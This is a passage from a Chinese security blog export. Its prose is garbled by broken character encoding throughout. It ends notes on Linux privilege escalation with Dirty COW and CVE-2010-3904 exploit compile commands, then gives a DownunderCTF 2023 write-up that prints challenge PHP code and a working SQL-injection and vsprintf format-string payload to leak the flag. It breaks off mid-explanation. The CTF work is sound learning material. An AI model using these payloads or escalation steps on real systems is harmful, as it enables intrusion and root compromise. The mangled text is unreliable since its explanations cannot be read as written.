<p>é»˜è®¤è¿™äº›ç¨‹åºä»¥rootæƒé™æ‰§è¡Œï¼Œå¦‚æœæœ‰å¹¸é‡åˆ°ä¸€ä¸ªæŠŠå…¶ä¸­è„šæœ¬é…ç½®æˆä»»æ„ç”¨æˆ·å¯å†™çš„ç®¡ç†å‘˜ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹è„šæœ¬ç­‰å›è¿rootshelläº†ï¼Œå½“ç„¶å‡ ç‡ä¹Ÿæ¯”è¾ƒå°ã€‚</p>
<h4 id="expç¼–è¯‘"><a href="#expç¼–è¯‘" class="headerlink" title="expç¼–è¯‘"></a>expç¼–è¯‘</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ä¸€èˆ¬çš„expç¼–è¯‘</span></span><br><span class="line">gcc test.c -o <span class="built_in">test</span></span><br><span class="line"><span class="comment">#dirtycow exp ç¼–è¯‘</span></span><br><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure>


<h4 id="å¸¸ç”¨çš„exp"><a href="#å¸¸ç”¨çš„exp" class="headerlink" title="å¸¸ç”¨çš„exp"></a>å¸¸ç”¨çš„exp</h4><p><strong>dirty-cow</strong><br>æ¼æ´èŒƒå›´ï¼š<br>Linux kernel &gt;&#x3D; 2.6.22ï¼ˆ2007å¹´å‘è¡Œï¼Œåˆ°2016å¹´10æœˆ18æ—¥æ‰ä¿®å¤ï¼Œæ‰€ä»¥å¦‚æœçœ‹åˆ°å†…æ ¸ç¼–è¯‘æ—¥æœŸæ˜¯2017å¹´ä»¥åçš„ä¸€èˆ¬ä¸è€ƒè™‘è„ç‰›ææƒï¼‰<br>EXPåœ°å€ï¼š<br>1ã€<a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a>  # æ¨èç”¨è¿™ä¸ª<br>2ã€<a href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>ã€gcc -pthread <span class="keyword">dirty.c </span>-o <span class="keyword">dirty </span>-lcrypt <span class="comment">#1çš„exp -lcrypt æ˜¯è°ƒç”¨cryptåº“è¿›è¡Œç¼–è¯‘å°±è¦åŠ  -lcrypt -pthreadåŒç†</span></span><br><span class="line"><span class="number">2</span>ã€make  <span class="comment">#2çš„expç›´æ¥make</span></span><br></pre></td></tr></table></figure>
<p><strong>æ³¨æ„:</strong> dirtycowæ˜¯é€šè¿‡ä¿®æ”¹rootçš„ç”¨æˆ·åå¯†ç è¿›è¡Œææƒçš„ï¼Œæ‰€ä»¥ä¸€å®šè¦è®°ä½å¤‡ä»½åŸæ¥çš„&#x2F;etc&#x2F;passwdï¼Œæ–¹ä¾¿åŠæ—¶æ¢å¤ã€‚</p>
<p><strong>CVE-2010-3904</strong><br>æ¼æ´èŒƒå›´:<br>Linux Kernel &lt;&#x3D; 2.6.36-rc8 RDS privilege escalation exploit<br>CVE-2010-3904</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">gcc</span> <span class="number">15285</span>.c -o <span class="number">15285</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>å†…ç½‘å®‰å…¨</category>
      </categories>
      <tags>
        <tag>ææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>2023DownunderCTF-writeup</title>
    <url>//posts/2023DownunderCTF-writeup/</url>
    <content><![CDATA[<h1 id="DownunderCTF-2023-writeup"><a href="#DownunderCTF-2023-writeup" class="headerlink" title="DownunderCTF 2023 writeup"></a>DownunderCTF 2023 writeup</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ¯”èµ›å‘¨æœ«æ‰“çš„ï¼Œwebé¢˜ç›®åšå‡ºæ¥ä¸€åŠ(ç®€å•çš„é‚£ä¸€åŠ)ï¼Œmediumä»¥ä¸Šçš„ä¸€é“é¢˜ç›®æ²¡åšå‡ºæ¥ï¼Œåæ¬¡ç”±äºè¿™æ¬¡åªæœ‰æˆ‘ä¸€ä¸ªäººå‚åŠ ï¼Œè€Œæˆ‘åªä¼šåšäº›webå’Œmiscä»¥åŠä¸€ç‚¹ç‚¹cryptoï¼Œé€†å‘å’Œpwnå®Œå…¨ä¸ä¼šï¼Œè€Œä¸”å›½å¤–çš„å¥—è·¯å’Œå›½å†…è¿˜æ˜¯ä¸ä¸€æ ·å•Šã€‚æœ€ç»ˆæ’åä¹Ÿæ˜¯æ³¯ç„¶ä¼—äººï¼Œä¸­é—´åæ¬¡ã€‚çœ‹äº†çœ‹åæ¥çš„wpï¼Œç®€å•çš„å†™ä¸€äº›è¿™æ¬¡æ”¶è·åˆ°å†…å®¹çš„ä¸€äº›é¢˜ç›®å§ã€‚</p>
<p>è¿™ä¸ªæ¯”èµ›å¾ˆå¥½çš„ä¸€ç‚¹åœ¨äºæä¾›äº†æ‰€æœ‰çš„é¢˜ç›®ç¯å¢ƒï¼Œä¸‹æ¬¡å†å‡ºé¢˜æ­£å¥½æ”¹æ”¹ã€‚ğŸ˜‚</p>
<p>é¢˜ç›®ç¯å¢ƒåœ°å€ï¼š<a href="https://github.com/DownUnderCTF/Challenges_2023_Public/">https://github.com/DownUnderCTF/Challenges_2023_Public/</a></p>
<span id="more"></span>

<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="smooth-jazz"><a href="#smooth-jazz" class="headerlink" title="smooth-jazz"></a>smooth-jazz</h4><p>é¢˜ç›®ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysql_fquery</span>(<span class="params"><span class="variable">$mysqli</span>, <span class="variable">$query</span>, <span class="variable">$params</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$mysqli</span>, <span class="title function_ invoke__">vsprintf</span>(<span class="variable">$query</span>, <span class="variable">$params</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$mysqli</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;db&#x27;</span>, <span class="string">&#x27;challuser&#x27;</span>, <span class="string">&#x27;challpass&#x27;</span>, <span class="string">&#x27;challenge&#x27;</span>);</span><br><span class="line">  <span class="variable">$username</span> = <span class="title function_ invoke__">strtr</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], [<span class="string">&#x27;&quot;&#x27;</span> =&gt; <span class="string">&#x27;\\&quot;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span> =&gt; <span class="string">&#x27;\\\\&#x27;</span>]);</span><br><span class="line">  <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_fquery</span>(<span class="variable">$mysqli</span>, <span class="string">&#x27;SELECT * FROM users WHERE username = &quot;%s&quot;&#x27;</span>, [<span class="variable">$username</span>]);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$res</span>)) &#123;</span><br><span class="line">     <span class="variable">$message</span> = <span class="string">&quot;Username not found.&quot;</span>;</span><br><span class="line">     <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_fquery</span>(<span class="variable">$mysqli</span>, <span class="string">&#x27;SELECT * FROM users WHERE username = &quot;&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;&quot; AND password = &quot;%s&quot;&#x27;</span>, [<span class="variable">$password</span>]);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$res</span>)) &#123;</span><br><span class="line">     <span class="variable">$message</span> = <span class="string">&quot;Invalid password.&quot;</span>;</span><br><span class="line">     <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$htmlsafe_username</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$username</span>, ENT_COMPAT | ENT_SUBSTITUTE);</span><br><span class="line">  <span class="variable">$greeting</span> = <span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> </span><br><span class="line">      ? <span class="string">&quot;Hello <span class="subst">$htmlsafe_username</span>, the server time is %s and the flag is %s&quot;</span></span><br><span class="line">      : <span class="string">&quot;Hello <span class="subst">$htmlsafe_username</span>, the server time is %s&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$message</span> = <span class="title function_ invoke__">vsprintf</span>(<span class="variable">$greeting</span>, [<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>), <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>)]);</span><br><span class="line">  </span><br><span class="line">  fail:</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;ğŸ· Smooth Jazz&lt;/title&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    body &#123;</span><br><span class="line">      background-color: <span class="comment">#f8f8f8;</span></span><br><span class="line">      font-family: Arial, sans-serif;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .container &#123;</span><br><span class="line">      max-width: <span class="number">400</span>px;</span><br><span class="line">      margin: <span class="number">100</span>px auto;</span><br><span class="line">      padding: <span class="number">20</span>px;</span><br><span class="line">      background-color: <span class="comment">#fff;</span></span><br><span class="line">      border-radius: <span class="number">5</span>px;</span><br><span class="line">      box-shadow: <span class="number">0</span> <span class="number">2</span>px <span class="number">5</span>px <span class="title function_ invoke__">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span><br><span class="line">      text-align: center;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h1 &#123;</span><br><span class="line">      color: <span class="comment">#333;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    form &#123;</span><br><span class="line">      margin-top: <span class="number">20</span>px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    label, input &#123;</span><br><span class="line">      display: block;</span><br><span class="line">      margin-bottom: <span class="number">10</span>px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    input[type=<span class="string">&quot;text&quot;</span>],</span><br><span class="line">    input[type=<span class="string">&quot;password&quot;</span>] &#123;</span><br><span class="line">      width: <span class="number">100</span>%;</span><br><span class="line">      padding: <span class="number">10</span>px;</span><br><span class="line">      border: <span class="number">1</span>px solid <span class="comment">#ccc;</span></span><br><span class="line">      border-radius: <span class="number">4</span>px;</span><br><span class="line">      box-sizing: border-box;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    input[type=<span class="string">&quot;submit&quot;</span>] &#123;</span><br><span class="line">      width: <span class="number">100</span>%;</span><br><span class="line">      padding: <span class="number">10</span>px;</span><br><span class="line">      background-color: <span class="comment">#4287f5;</span></span><br><span class="line">      color: white;</span><br><span class="line">      border: none;</span><br><span class="line">      border-radius: <span class="number">4</span>px;</span><br><span class="line">      cursor: pointer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .music-player &#123;</span><br><span class="line">      margin-top: <span class="number">20</span>px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h2 &#123;</span><br><span class="line">      color: <span class="comment">#333;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    audio &#123;</span><br><span class="line">      width: <span class="number">100</span>%;</span><br><span class="line">      margin-top: <span class="number">10</span>px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .message &#123;</span><br><span class="line">      margin-top: <span class="number">10</span>px;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h1</span>&gt;<span class="title">Smooth</span> <span class="title">Jazz</span>&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">username</span>&quot;&gt;<span class="title">Username</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">id</span>=&quot;<span class="title">username</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Enter</span> <span class="title">your</span> <span class="title">username</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">      &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">password</span>&quot;&gt;<span class="title">Password</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">id</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Enter</span> <span class="title">your</span> <span class="title">password</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">      &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">Login</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">music</span>-<span class="title">player</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">audio</span> <span class="title">src</span>=&quot;/<span class="title">offering</span>-<span class="title">larry</span>-<span class="title">stephens</span>.<span class="title">mp3</span>&quot; <span class="title">id</span>=&quot;<span class="title">audio</span>&quot;&gt;&lt;/<span class="title">audio</span>&gt;</span></span><br><span class="line"><span class="class">      <span class="title">If</span> <span class="title">you</span> <span class="title">are</span> <span class="title">stuck</span>, <span class="title">you</span> <span class="title">can</span> &lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">javascript</span>:<span class="title">document</span>.<span class="title">getElementById</span>(&#x27;<span class="title">audio</span>&#x27;).<span class="title">play</span>()&quot;&gt;<span class="title">listen</span> <span class="title">to</span> <span class="title">some</span> <span class="title">smooth</span> <span class="title">jazz</span>&lt;/<span class="title">a</span>&gt;.</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">message</span>&quot; <span class="title">class</span>=&quot;<span class="title">message</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">p</span>&gt;&lt;?= $<span class="title">message</span> ?? &#x27;&#x27; ?&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å…ˆè¯´ä¸‹æ•´ä½“é€»è¾‘ï¼Œ</p>
<p>1ã€å…ˆåˆ¤æ–­ç”¨æˆ·åæ˜¯å¦å­˜åœ¨</p>
<p>2ã€sqlæŸ¥è¯¢å¯¹åº”ç”¨æˆ·åã€å¯†ç æ˜¯å¦å­˜åœ¨åœ¨æ•°æ®åº“</p>
<p>3ã€æœ€å$usernameè¿˜è¦å¼ºç­‰äº(&#x3D;&#x3D;&#x3D;)admin æ‰èƒ½æ‹¿åˆ°flag</p>
<p>å…¶å®ä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯å®½å­—èŠ‚æ³¨å…¥å‘¢ï¼Œå› ä¸ºæˆ‘æ„é€ admin%dfâ€™è¿›å…¥å‘ç°å¯ä»¥ç»•è¿‡ç¬¬ä¸€æ­¥ï¼Œä½†æ˜¯æ€ä¹ˆéƒ½æ— æ³•æ³¨å…¥ï¼Œåç»­æŸ¥çœ‹æ•°æ®åº“ç¼–ç ä¹Ÿæ²¡æœ‰gbkçš„ç¼–ç å½¢å¼ã€‚å…¶å®è¿™é‡Œæ¶‰åŠçš„æ˜¯å¦ä¸€ä¸ªè€ƒç‚¹ï¼š</p>
<p><strong>UTFæˆªæ–­</strong>ï¼šUTFæˆªæ–­ä¼šæˆªæ–­æ— æ•ˆå†…å®¹ï¼Œæ¯”å¦‚ adminå’Œadmin%ff åº”è¯¥æ˜¯ä¸€æ ·çš„ã€‚</p>
<p>æ‰€ä»¥æˆ‘è¿™é‡Œå¯ä»¥é€šè¿‡è¿™ç§æ–¹æ³•ç»•è¿‡ç¬¬ä¸€æ­¥ï¼Œä½†è¿™é‡Œä¸æ˜¯å®½å­—èŠ‚æ³¨å…¥ã€‚è€Œä¸”åç»­è¿˜è¦å¼ºç­‰äºadminï¼Œè¿™ä¸ª&#x3D;&#x3D;&#x3D;å°è±¡ä¸­åœ¨éç‰¹æ®Šç¯å¢ƒä¸‹æ˜¯ä¸å¯ç»•è¿‡çš„ã€‚è€Œä¸”æ ¹æ®ä»£ç æ¥çœ‹ï¼Œæ³¨å…¥ç‚¹åº”è¯¥åœ¨ç¬¬äºŒä¸ªæŸ¥è¯¢è¯­å¥ä¸­ã€‚</p>
<p>ç°åœ¨å¥½åƒæ˜¯æ— è§£çš„ï¼Œä½†æ˜¯ä»£ç æœ€å¼€å¤´çš„åœ°æ–¹æœ‰ä¸€ä¸ªvsprintfï¼Œæ¯”èµ›ä¸­æˆ‘ä¹Ÿå¿½ç•¥äº†ï¼Œæˆ‘ä»¥ä¸ºè€ƒç‚¹åœ¨ä¸‹é¢ï¼Œè¿™é‡Œçš„vsprintf æ ¹æ®æ ¼å¼å­—ç¬¦ä¸²ä¸­çš„æ ¼å¼æŒ‡ç¤ºç¬¦ï¼Œå¸¸è§ç”¨æ³•å°±æ˜¯ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># %[argnum$][flags][width][.precision]specifier.</span></span><br><span class="line"><span class="comment"># å¿…é¡»å‚æ•°å°±æ˜¯%specifier ä¸­é—´éƒ½æ˜¯å¯é€‰å‚æ•°</span></span><br><span class="line"><span class="comment">#ä¸€äº›ç”¨æ³•</span></span><br><span class="line"><span class="comment"># %è¡¨ç¤ºè¦è¢«æ ¼å¼çš„å‚æ•° åé¢è·Ÿç±»å‹ %så°±æ˜¯å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">vsprintf</span>(<span class="string">&#x27;Hello, %s! Today is %s.&#x27;</span>, [<span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;Monday&#x27;</span>]);</span><br><span class="line"><span class="comment"># %1$s è¡¨ç¤ºç¬¬ä¸€ä¸ªå­—ç¬¦è¦è¢«æ ¼å¼æˆå­—ç¬¦ä¸²ï¼Œ%2$d è¡¨ç¤ºç¬¬äºŒä¸ªå­—ç¬¦è¦è¢«æ ¼å¼æˆæ•°å­—ã€‚</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">vsprintf</span>(<span class="string">&#x27;Name: %1$s, Age: %2$d&#x27;</span>, [<span class="string">&#x27;John&#x27;</span>, <span class="number">25</span>]);</span><br><span class="line"><span class="comment"># %1$&#x27;a10 è¡¨ç¤ºå•å¼•å·åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦è¦å¡«å…… å¡«å……10æ¬¡ã€‚ç„¶åæ‹¼æ¥åé¢çš„3</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">vsprintf</span>(<span class="string">&quot;Like %1\$&#x27;a10s&quot;</span>, [<span class="string">&quot;3&quot;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å½“ç„¶è¿˜æ˜¯å»ºè®®å»çœ‹ä¸‹å®˜æ–¹æ–‡æ¡£ï¼Œè¯¦ç»†äº†è§£æ‰€æœ‰ç”¨æ³•ï¼š</p>
<p><a href="https://www.php.net/manual/zh/function.vsprintf.php">https://www.php.net/manual/zh/function.vsprintf.php</a></p>
<p>å¦‚æœæˆ‘ä»¬æ’å…¥ä¸€ä¸ª%1$c ç„¶åæŠŠpassword çš„ sha1 ç”Ÿæˆä¸€ä¸ª34å¼€å¤´çš„å­—ç¬¦ä¸²(charç±»å‹åªæ‹¿å‰é¢çš„ä¸€ä¸ªcharæ ¼å¼åŒ–å­—ç¬¦ä¸²):</p>
<p>![image-20230906145114573](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230906145114573.png)</p>
<p>é‚£ä¹ˆæˆ‘ä»¬å°±æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ—¶å€™å°±æ‹¿åˆ°ä¸€ä¸ªåŒå¼•å·ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥é—­åˆäº†ã€‚</p>
<p>é‚£æˆ‘ä»¬çš„æ³¨å…¥payloadå°±å¯ä»¥æ˜¯</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">username=admin%ff%1$c||1#&amp;password=668</span><br></pre></td></tr></table></figure>

<p>\xff æ˜¯ä¸ºäº†utf8æˆªæ–­ä»è€Œç»•è¿‡sqlæŸ¥è¯¢éƒ¨åˆ†çš„adminçš„åˆ¤æ–­ï¼Œæˆªæ–­åé¢çš„ä¸œè¥¿éƒ½ä¸ä¼šè¢«å’Œadminæ¯”è¾ƒäº†</p>
<p>![image-20230906151947718](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230906151947718.png)</p>
<p>ä½†æ˜¯è¿˜æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæ€ä¹ˆçªç ´&#x3D;&#x3D;&#x3D;â€™adminâ€™å¼ºç­‰åˆ¤æ–­æ‰“å°flagå‘¢ï¼Ÿ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$htmlsafe_username</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$username</span>, ENT_COMPAT | ENT_SUBSTITUTE);</span><br><span class="line"><span class="variable">$greeting</span> = <span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> </span><br><span class="line">    ? <span class="string">&quot;Hello <span class="subst">$htmlsafe_username</span>, the server time is %s and the flag is %s&quot;</span></span><br><span class="line">    : <span class="string">&quot;Hello <span class="subst">$htmlsafe_username</span>, the server time is %s&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">vsprintf</span>(<span class="variable">$greeting</span>, [<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>), <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>)]);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä»ç„¶åˆ©ç”¨vsprintfï¼Œæˆ‘ä»¬æ—¢ç„¶ç»•ä¸è¿‡&#x3D;&#x3D;&#x3D;â€adminâ€ èƒ½ä¸èƒ½åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ—¶å€™å†åˆ›å»ºä¸€ä¸ªå˜é‡æ”¾ç½®ä½æŠŠgetenv(â€˜FLAGâ€™) æ‰“å°å‡ºæ¥ï¼Ÿ</p>
<p>å¦‚æœæˆ‘ä»¬ç›´æ¥æ’å…¥%2$s é‚£ä¹ˆåœ¨sqlæ³¨å…¥æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ—¶å€™å°±ä¼šæŠ¥é”™ï¼Œå› ä¸ºé‚£é‡Œçš„å‚æ•°åªæœ‰ä¸€ä¸ª[password]ï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯æˆåŠŸæ‰§è¡Œsqlæ³¨å…¥å¹¶åœ¨æœ€åä¸€ä¸ªvsprintfä¸­èƒ½æ‹¿åˆ°ç±»ä¼¼%2$sçš„å­—æ®µæ¥æŠŠflagæ ¼å¼åŒ–å†™è¿›å»ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦ç¬¬äºŒä¸ªå˜é‡ä½ç½®å®ƒåœ¨æ‹¼æ¥sqlè¯­å¥æ—¶ä¸è¿›è¡Œæ ¼å¼åŒ–ï¼Œåœ¨æœ€åä¸€ä¸ªvsprintfå¤„æŠŠflagæ ¼å¼åŒ–è¿›å»ï¼š</p>
<p>è¿™æ­¥çš„å…³é”®åœ¨äºhtmlspecialchars</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$htmlsafe_username</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$username</span>, ENT_COMPAT | ENT_SUBSTITUTE);</span><br><span class="line"><span class="comment">//è¿™è¡Œä»£ç å°† $username å˜é‡çš„å€¼è¿›è¡Œ HTML è½¬ä¹‰ï¼Œå¹¶å°†è½¬ä¹‰åçš„ç»“æœèµ‹ç»™ $htmlsafe_username å˜é‡ã€‚</span></span><br><span class="line"><span class="comment">//ç¬¬ä¸€ä¸ªå‚æ•° $username æ˜¯éœ€è¦è¿›è¡Œè½¬ä¹‰çš„å­—ç¬¦ä¸²ï¼Œå®ƒçš„å€¼è¢«ä¼ é€’ç»™ htmlspecialchars() å‡½æ•°è¿›è¡Œå¤„ç†ã€‚</span></span><br><span class="line"><span class="comment">//ç¬¬äºŒä¸ªå‚æ•° ENT_COMPAT | ENT_SUBSTITUTE æ˜¯è½¬ä¹‰æ¨¡å¼ï¼Œç”¨äºæŒ‡å®šè½¬ä¹‰çš„è§„åˆ™ã€‚</span></span><br><span class="line"><span class="comment">//ENT_COMPAT è¡¨ç¤ºåªè½¬ä¹‰åŒå¼•å·ï¼Œå°†åŒå¼•å·è½¬æ¢ä¸º &amp;quot;ã€‚å…¶ä»–ç‰¹æ®Šå­—ç¬¦ä¸è½¬ä¹‰ã€‚</span></span><br><span class="line"><span class="comment">//ENT_SUBSTITUTE è¡¨ç¤ºå°†æ— æ³•è½¬ä¹‰çš„å­—ç¬¦ç”¨ Unicode æ›¿ä»£ç¬¦å·æ›¿ä»£ï¼Œè€Œä¸æ˜¯å¿½ç•¥æˆ–åˆ é™¤å®ƒä»¬ã€‚</span></span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨ &gt; è¢«ç¼–ç ä¸º&amp;gt æˆ‘ä»¬å¯ä»¥æ„é€  %1$â€™&gt;%2$s</p>
<p>$â€™æ˜¯ä»€ä¹ˆæ„æ€æˆ‘ä»¬å¯ä»¥çœ‹å®˜æ–¹æ‰‹å†Œï¼š</p>
<p>![image-20230907135735471](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230907135735471.png)</p>
<p>ä¹Ÿå°±æ˜¯ä¸Šé¢çš„å­—ç¬¦ä¸²è¦å¡«å…… &gt; ä½†æ˜¯æ²¡å†™æ•°é‡æ‰€ä»¥å¡«å……0ä¸ªå°±æ˜¯ç©ºäº†ï¼Œ%1$â€™&gt;åœ¨vsprintfå¤„ç†æ—¶å°±ä¼šå˜æˆç©ºï¼Œåªå‰©ä¸‹%2$s</p>
<p>sqlè¯­å¥å˜æˆï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> &quot;admin&quot;<span class="operator">||</span><span class="number">1</span>#<span class="operator">%</span><span class="number">2</span>$s&quot; AND password = &quot;<span class="number">34</span>c66477519b949b09b45e131347c17b5822a30a&quot;SELECT * FROM users WHERE username = &quot;admin&quot;||1#%2$s&quot; <span class="keyword">AND</span> password <span class="operator">=</span> </span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè§£é‡Šä¸‹ä¸ºå•¥%1$â€™&gt;%2$s ä¸æ˜¯æŒ‰ç…§æˆ‘ä»¬ç†è§£çš„åº”è¯¥ä¸¤ä¸ªå‚æ•°éƒ½æ ¼å¼åŒ–è¿›å»ï¼Œå…³é”®è¿˜æ˜¯æ–‡æ¡£ã€‚</p>
<p><code>%[argnum$][flags][width][.precision]specifier</code>.</p>
